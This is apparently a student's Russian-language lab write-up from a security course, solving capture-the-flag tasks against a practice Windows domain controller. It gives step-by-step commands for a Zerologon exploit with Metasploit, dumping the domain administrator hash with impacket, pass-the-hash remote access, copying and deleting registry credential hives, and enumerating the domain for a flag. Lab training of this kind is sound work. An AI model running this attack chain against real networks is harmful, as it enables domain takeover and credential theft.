Подключимся к удаленной системе по `RDP`, используя `xfreerdp` – свободный `RDP-клиент` с консольным интерфейсом, укажем пользователя, пароль, хост и удобную нам ширину экрана:

```bash
xfreerdp /u:john /p:loveme1 /w:768 /v:10.8.0.14
```

Запускаем инсталятор:

![image](https://github.com/TreninYI/InfoSec/assets/121427985/dfd54541-fdb4-45f3-950a-0439d8f6446a)

После получения соединения в `msf` выполним базовую разведку и убедимся, что обладаем максимальными правами, после чего прочтем флаг:

```bash
> whoami
> cd C:\Users\Michael\Desktop
> type root.txt
```
```mq72eh6mfs77fv3d6cje5mxm6c```

![image](https://github.com/TreninYI/InfoSec/assets/121427985/5e2ec563-e077-41f9-99e8-a5c161faf2e6)

## Практика «Захват управления инфраструктурой сети»

Задание:

Для подготовки стенда:

Необходимо скачать архив по ссылке: [Windows Server 2016.rar](https://disk.yandex.ru/d/yiqEndplVXwfOA)

Распаковать данный архив и перейти в появившуюся директорию `Windows Server 2016`. Далее импортировать виртуальную машину `Windows Server 2016` двойным нажатием на файл `Windows Server 2016.vmx`.

Чтобы машина `Window`s получила `IP` адрес в сети, необходимо после запуска машины зайти в нее под каким либо пользователем. Для каждой машины вам предоставлен пользователь для входа в нее, с целью инициализации сети. В данной виртуальной машине вам нужно использовать аккаунт:
```
Логин: master
Пароль: Qwerty123
```
Задание 1

Проанализируйте защищенность узла, развернутого вами в виртуальном стенде, определите версию ПО и попытайтесь определить известные уязвимости данной операционной системы. Обнаружьте известную уязвимость, которой подвержена данная операционная система и проэксплуатируйте ее при помощи фреймворка `metasploit`.

В качестве подтверждения успешной эксплуатации предоставьте флаг (секретную строку в формате 26 букв и цифр) из файла `root.txt`, расположенного в папке рабочего стола пользователя `Administrator`.

Задание 2

Соберите информацию о домене при помощи утилит `ldapdomaindump` или `BloodHound` и найдите в домене пользователя, у которого в комментарии указан секретный флаг в формате: `Flag{ПРОИЗВОЛЬНЫЕ ЦИФРЫ И БУКВЫ}`.

В качестве ответа предоставьте всю строку флага в формате `Flag{ПРОИЗВОЛЬНЫЕ ЦИФРЫ И БУКВЫ}`.

Решение:

Проведем сканирование сервера с помощью `nmap`:

```bash
nmap -Pn -n -F -v --open 192.168.206.128
```

![image](https://github.com/TreninYI/InfoSec/assets/121427985/708b1989-8cae-476f-8b49-0f6f57799fa8)

Попробуем определить версию `DNS-сервера` с помощью сканирования `SMB-порта` с помощью скриптов `nmap`:

```bash
nmap -Pn -n -p 445 -sV -sC -v --open 192.168.206.128
```

![image](https://github.com/TreninYI/InfoSec/assets/121427985/6bbd80c3-ac8e-4967-b45e-4f0ce2b849d5)

Запустим `msfconsole`:

```bash
msfconsole
```

Используем средства `Metasploit Framework` для проверки сервера на эту уязвимость, укажем `IP` сервера и его `NetBIOS` имя, ранее полученное при сканировании `nmap`. Проверим, что хост действительно уязвим написав `check` и произведем эксплуатацию уязвимости:

```bash
msf6 > search zerologon
msf6 > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
msf6 > set RHOSTS 192.168.206.128
msf6 > set NBNAME DC1
msf6 > check
msf6 > run
```

![image3](https://github.com/TreninYI/InfoSec/assets/121427985/3b1c7eba-7aca-4691-b0a9-05f43323eb17)

Для корректной эксплуатации нам нужно сначала получить учетные данные администратора домена, а затем, используя их, восстановить старый пароль машинного аккаунта. Используем для этого `impacket` — набор инструментов для работы с протоколами сетевого и прикладного уровня в `Python`, позволяющего взаимодействовать с `Windows-сетями` из `Linux` и вести тестирование их безопасности:

```bash
locate impacket
```

Ключевым инструментом на этом шаге будет `secretsdump – скрипт`, используемый для получения учетных данных с удаленных `Windows-компьютеров` или локальных файлов реестра:

```bash
python3 /usr/lib/python3/dist-packages/impacket/examples/secretsdump.py

impacket-secretsdump -h
```

Используем `secretsdump` для получения `NTLM-хэша` администратора домена. Ключ `-just-dc-user` позволяет получить хэш нужного нам пользователя, `-no-pass` указывает на то, что пароль машинного аккаунта пустой, `sandbox.local` – имя домена, `DC1$` - имя машинной учетной записи, а `IP 192.168.206.128` – адрес контроллера домена.

```bash
impacket-secretsdump -no-pass -just-dc-user administrator ‘sandox.local/DC1$@192.168.206.128’
```

![image](https://github.com/TreninYI/InfoSec/assets/121427985/56b867c5-3247-42ce-acfc-4c1311f7db8f)


Для восстановления пароля машинной учетной записи нам необходимо вытащить его из реестра `Windows`, для чего мы можем подключиться к контроллеру домена с помощью инструмента `wmiexec`, который используется для выполнения команд на удаленной системе `Windows` через `WMI` (Windows Management Instrumentation).

```bash
impacket-wmiexec -h
```

Укажем ранее полученный хэш администратора и проверим права после подключения, а затем найдем первый флаг:

```bash
impacket-wmiexec -hashes <aad3b435b51404eeaad3b435b51404ee:c263e573945cdc50d44f08ad17fd9b52> 'sandbox.local/administrator@192.168.206.128'
```

```bash
c:\ > whoami
c:\users\administrator > cd c:/users/administrator/desktop/
c:\users\administrator\desktop > dir
 Volume in drive C has no label.
 Volume Serial Number is 3052-8B43

 Directory of c:\users\administrator\desktop

03/23/2023  05:20 AM    <DIR>          .
03/23/2023  05:20 AM    <DIR>          ..
04/14/2023  04:13 AM                26 root.txt
               1 File(s)             26 bytes
               2 Dir(s)  50,944,700,416 bytes free

c:\users\administrator\desktop > type root.txt
6p7ne9bk90z7yozcv5c8etx9bz
```
 Далее сохраним интересующие нас ветки реестра в отдельные файлы:

 ```bash
C:\ > reg save HKLM\SYSTEM system.save
C:\ > reg save HKLM\SAM sam.save
C:\ > reg save HKLM\SECURITY security.save
```

Теперь скачаем эти файлы на локальную машину:

```bash
C:\ > lget system.save
C:\ > lget sam.save
C:\ > lget security.save
 ```

Затем удали их:

```bash
C:\ > del /f system.save security.save sam.save
```

Локально проанализируем эти файлы с помощью `impacket-secretsdump`:

![image5](https://github.com/TreninYI/InfoSec/assets/121427985/1e847d3a-bcd0-4c97-b66d-367b015e1c96)

Теперь, когда мы получили старый пароль машинного аккаунта из секретов `LSA`, мы можем вновь запустить эксплойт из `msf`, но уже в режиме восстановления пароля:

```bash
msfconsole
```

```bash
msf6 > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
msf6 > set RHOSTS 192.168.206.128
msf6 > set NBNAME DC1
```

Опции при этом останутся прежними, кроме двух новых: `ACTION` – выбора действия и `PASSWORD` – значения пароля машинного аккаунта в `HEX`:

```bash
msf6 > set ACTION RESTORE
msf6 > set PASSWORD <$d900b933...>
```

Восстановим пароль:

```bash
msf6 > run
```
Убедимся, что доступ сохранился:

```bash
impacket-wmiexec -hashes <aad3b435b51404eeaad3b435b51404ee:c263e573945cdc50d44f08ad17fd9b52> 'sandbox.local/administrator@192.168.206.128'
```

Для получения второго флага я использовал утилиту `ldapdomaindump`:

```bash
ldapdomaindump -u sandbox.local\\administrator -p aad3b435b51404eeaad3b435b51404ee:c263e573945cdc50d44f08ad17fd9b52 192.168.206.128
```

```bash
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                             
┌──(kali㉿kali)-[~]
└─$ ls
Desktop                      domain_policy.html          Music
Documents                    domain_policy.json          Pictures
domain_computers_by_os.html  domain_trusts.grep          Public
domain_computers.grep        domain_trusts.html          sam.save
domain_computers.html        domain_trusts.json          security.save
domain_computers.json        domain_users_by_group.html  system.save
domain_groups.grep           domain_users.grep           Templates
domain_groups.html           domain_users.html           Videos
domain_groups.json           domain_users.json
domain_policy.grep           Downloads
и в файле domain_users.grep по поиску нашел флаг.

S-1-5-21-3410936058-429566570-3398717245-3262    Flag{You_Are_C00L}
```
## Это было последнее задание на курсе, спасибо за внимание!








